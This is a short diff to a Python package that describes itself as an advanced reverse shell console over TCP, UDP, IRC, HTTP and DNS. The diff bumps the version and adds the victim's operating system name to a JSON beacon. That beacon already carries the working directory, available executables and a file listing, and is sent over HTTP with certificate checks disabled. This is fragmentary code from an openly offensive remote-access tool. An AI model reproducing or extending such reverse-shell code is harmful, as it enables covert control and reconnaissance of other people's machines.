@@ -24,7 +24,7 @@ This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -50,11 +50,11 @@ __all__ = []
 print(copyright)
 
 from json import dumps
-from platform import node
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from sys import argv, stderr, exit
 from ssl import _create_unverified_context
 from urllib.request import urlopen, Request
@@ -119,6 +119,7 @@ while True:
                                     "cwd": getcwd(),
                                     "executables": get_executables(),
                                     "files": listdir(),
+                                    "system": system(),
                                 }
                             ).encode()
                         ),
